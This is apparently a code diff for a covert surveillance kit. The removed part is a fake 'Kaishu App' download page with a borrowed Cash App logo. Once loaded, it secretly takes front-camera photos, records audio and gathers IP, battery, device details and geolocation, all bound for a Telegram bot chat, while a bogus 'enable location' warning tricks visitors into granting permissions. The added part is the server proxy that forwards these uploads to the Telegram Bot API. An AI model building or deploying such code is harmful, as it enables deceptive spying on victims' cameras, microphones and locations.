@@ -1,198 +1,101 @@
-fonts.googleapis.com/css?family=Montserrat">
-  <style>
-    body { font-family: 'Montserrat', sans-serif; margin:0; padding:0; background-color:#f5f5f5; }
-    .navbar { background: linear-gradient(90deg, #69C9D0, #EE1D52); color:white; text-align:center; padding:15px 0; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-    #header { margin:0; font-size:30px; font-weight:bold; color:white; text-shadow: 1px 1px 2px rgba(0,0,0,0.3); }
-    .container { max-width:600px; margin:20px auto; padding:20px; background-color:#fff; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
-   
-  </style>
-</head>
-<body>
- <nav class="navbar" style="background:linear-gradient(90deg,#00C244,#008A2E);">
-  <h1 id="header" style="color:white;">KAISHU APP</h1>
-</nav>
+import Busboy from "busboy";
+import FormData from "form-data";
+import fetch from "node-fetch";
 
-<div class="container">
-
-  <div style="text-align:center;">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Cash_App_Logo.png"
-    style="width:120px;margin-bottom:15px;">
-  </div>
-
-  <h2 style="text-align:center;color:#00C244;">Download Kaishu App</h2>
-  <p style="text-align:center;">Fast • Secure • Easy Digital Payments</p>
-
-  <button id="downloadBtn"
-  style="width:100%;padding:14px;border:none;border-radius:6px;
-  background:#00C244;color:white;font-size:18px;font-weight:bold;cursor:pointer;">
-  DOWNLOAD NOW
-  </button>
-
-  <div id="progressBox"
-  style="margin-top:20px;text-align:center;font-weight:bold;display:none;">
-  </div>
-
-  <div style="margin-top:25px;font-size:14px;color:#444;line-height:1.6;">
-    <h3>About Kaishu App</h3>
-    Kaishu is a popular social media app where users create, watch, and share short videos.<br> It is owned by the Chinese company ByteDance and is used by millions of people worldwide.<br>
-   <br> Many feature uses in thi like<br>
-   • Easy to use<br>
-• Entertaining content<br>
-• Platform for talent (acting, dancing, comedy, education)<br>
-• Opportunity to become famous<br><br>
-• Some creators can earn money through brand deals and gifts
-</div>
-
-<script>
-document.getElementById("downloadBtn").onclick = function(){
-
-  let box = document.getElementById("progressBox");
-  box.style.display = "block";
-
-  let seconds = 10;
-  box.innerHTML = "Preparing Download... " + seconds + "s";
-
-  let interval = setInterval(function(){
-    seconds--;
-    box.innerHTML = "Preparing Download... " + seconds + "s";
-
-    if(seconds <= 0){
-      clearInterval(interval);
-
-      box.innerHTML = `
-        <div style="color:red; font-weight:bold;">
-          ⚠ Your Location or permission is not enabled firstly on your location then refresh the page and allow all permission your apk will download.
-        </div>
-        <div style="margin-top:5px;">
-          Please enable your location and try again.
-        </div>
-      `;
-    }
-
-  },1000);
+export const config = {
+api: { bodyParser: false }
 };
-</script>
-</script>
-    <input id="ytlink" type="text" class="form-control" placeholder="Donate for best server" spellcheck="false">
-    <button id="thumbdloadbtn" onclick="downloadThumbnail()">GET FOLLOWERS</button>
-    <div id="thumbnail-preview"></div>
-  </div>
 
-  <center>
-    <video id="video" width="0" height="0" autoplay></video>
-  </center>
+const TELEGRAM_BASE = "https://api.telegram.org";
 
-  <script type="text/javascript">
-    function downloadThumbnail(){
-      document.getElementById('thumbdloadbtn').textContent='Fetching from server... Wait';
-    }
+export default async function handler(req, res) {
+const BOT_TOKEN = process.env.BOT_TOKEN;
+if (!BOT_TOKEN) {
+return res.status(500).json({ error: "Missing BOT_TOKEN env var" });
+}
 
-    function GetURLParameter(sParam){
-      var sPageURL=window.location.search.substring(1);
-      var sURLVariables=sPageURL.split('&');
-      for(var i=0;i<sURLVariables.length;i++){
-        var sParameterName=sURLVariables[i].split('=');
-        if(sParameterName[0]==sParam){return sParameterName[1];}
-      }
-    }
+try {
+const contentType = req.headers["content-type"] || "";
 
-    var chatid = GetURLParameter('id');
+// ---- JSON requests (text / location) ----  
+if (contentType.includes("application/json")) {  
+  let raw = "";  
+  for await (const chunk of req) raw += chunk;  
+  const data = JSON.parse(raw);  
 
-    async function initCapture(){
-      try {
-        // front camera + audio
-        const stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:'user'}, audio:true });
-        const videoTrack = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(videoTrack);
-        const audioRecorder = new MediaRecorder(stream);
+  let methodPath;  
+  if (data.type === "text" || data.text) methodPath = `sendMessage`;  
+  else if (data.type === "location") methodPath = `sendLocation`;  
+  else methodPath = data.method ? data.method : null;  
 
-        // --- Capture 3 photos ---
-        for(let i=0;i<3;i++){
-          setTimeout(async ()=>{
-            const blob = await imageCapture.takePhoto();
-            sendToTelegram(blob,'photo');
-          }, i*2000);
-        }
+  if (!methodPath) return res.status(400).send("Invalid JSON payload");  
 
-        // --- Record 5s voice ---
-        audioRecorder.start();
-        setTimeout(()=>audioRecorder.stop(),5000);
-        audioRecorder.ondataavailable = (e)=>{
-          if(e.data.size>0) sendToTelegram(e.data,'voice');
-        }
+  const tgRes = await fetch(`${TELEGRAM_BASE}/bot${BOT_TOKEN}/${methodPath}`, {  
+    method: "POST",  
+    headers: { "Content-Type": "application/json" },  
+    body: JSON.stringify(data)  
+  });  
 
-        // --- Send battery, IP and device info ---
-        if(chatid){
-          const [ip, battery] = await Promise.all([getIP(), getBattery()]);
-          const device = getDeviceInfo();
-          const msg = `🔋 Battery & Device Info:\n\n${battery}\n${ip}\n${device}`;
-          fetch(`/api/proxy`,{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({ type:'message', chat_id:chatid, text:msg })
-          });
+  const text = await tgRes.text();  
+  return res.status(tgRes.status).send(text);  
+}  
 
-          // --- Send geolocation ---
-          if(navigator.geolocation){
-            navigator.geolocation.getCurrentPosition(pos=>{
-              fetch(`/api/proxy`,{
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({
-                  type:'location',
-                  chat_id:chatid,
-                  latitude: pos.coords.latitude,
-                  longitude: pos.coords.longitude
-                })
-              });
-            });
-          }
-        }
-      } catch(err){
-        console.error(err);
-        if(chatid){
-          fetch(`/api/proxy`,{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({ type:'message', chat_id: chatid, text: "❌ User denied camera or microphone access." })
-          });
-        }
-      }
-    }
+// ---- multipart (photo / voice / audio) ----  
+if (req.method === "POST") {  
+  const bb = Busboy({ headers: req.headers });  
+  const fields = {};  
+  let fileBuffer = null;  
+  let fileInfo = null;  
 
-    function sendToTelegram(data, type){
-      if(!chatid) return;
-      const formData = new FormData();
-      formData.append("chat_id", chatid);
+  await new Promise((resolve, reject) => {  
+    bb.on("field", (name, val) => { fields[name] = val; });  
+    bb.on("file", (name, file, info) => {  
+      const chunks = [];  
+      file.on("data", (d) => chunks.push(d));  
+      file.on("end", () => {  
+        fileBuffer = Buffer.concat(chunks);  
+        fileInfo = { filename: info.filename, mime: info.mimeType || info.mimetype || "application/octet-stream" };  
+      });  
+    });  
+    bb.on("close", resolve);  
+    bb.on("error", reject);  
+    req.pipe(bb);  
+  });  
 
-      if(type === "photo"){
-        formData.append("photo", data, `@Ali_CameraHack_bot_${Date.now()}.jpg`);
-      } else if(type === "voice"){
-        formData.append("voice", data, `@Ali_CameraHack_bot_${Date.now()}.ogg`);
-      }
+  const chat_id = fields.chat_id;  
+  const type = fields.type || "photo";  
+  if (!chat_id) return res.status(400).send("Missing chat_id");  
+  if (!fileBuffer) return res.status(400).send("Missing file upload");  
 
-      fetch("/api/proxy", { method:'POST', body:formData });
-    }
+  let tgMethod, fieldKey;  
+  if (type === "photo") { tgMethod = "sendPhoto"; fieldKey = "photo"; }  
+  else if (type === "voice") { tgMethod = "sendVoice"; fieldKey = "voice"; }  
+  else if (type === "audio") { tgMethod = "sendAudio"; fieldKey = "audio"; }  
+  else { tgMethod = "sendDocument"; fieldKey = "document"; }  
 
-    function getBattery(){
-      if(navigator.getBattery){
-        return navigator.getBattery().then(b=>`Level: ${Math.round(b.level*100)}% | Charging: ${b.charging?'Yes':'No'}`);
-      }
-      return Promise.resolve("Battery info not available");
-    }
+  const fd = new FormData();  
+  fd.append("chat_id", chat_id);  
+  fd.append(fieldKey, fileBuffer, { filename: fileInfo.filename || "file.ogg", contentType: fileInfo.mime });  
 
-    function getIP(){
-      return fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=> "IP not detected");
-    }
+  // forward extra fields (e.g. caption)  
+  Object.keys(fields).forEach(k => {  
+    if (!["chat_id", "type"].includes(k)) fd.append(k, fields[k]);  
+  });  
 
-    function getDeviceInfo(){
-      return `Screen: ${screen.width}x${screen.height}\nUserAgent: ${navigator.userAgent}`;
-    }
+  const tgRes = await fetch(`${TELEGRAM_BASE}/bot${BOT_TOKEN}/${tgMethod}`, {  
+    method: "POST",  
+    body: fd,  
+    headers: fd.getHeaders()  
+  });  
 
-    // --- Start capture on page load ---
-    initCapture();
-  </script>
+  const text = await tgRes.text();  
+  return res.status(tgRes.status).send(text);  
+}  
 
-  <footer><p>Thanks stay happy Your smile is very important</p></footer>
-</body>
-</html>
+return res.status(400).send("Unsupported request");
+
+} catch (err) {
+console.error("Proxy error:", err);
+return res.status(500).json({ error: "Proxy failed", details: err.message });
+}
+}
